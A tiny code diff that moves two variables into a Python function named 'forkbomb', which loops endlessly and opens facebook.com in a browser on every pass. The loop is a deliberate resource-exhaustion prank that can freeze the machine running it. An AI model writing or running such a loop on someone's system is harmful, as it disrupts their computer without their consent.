@@ -1,6 +1,6 @@
-mal = True
-number = 0
 def forkbomb():
+  mal = True
+  number = 0
   while mal == True:
     os.system("xdg-open https://www.facebook.com")
     number += 1
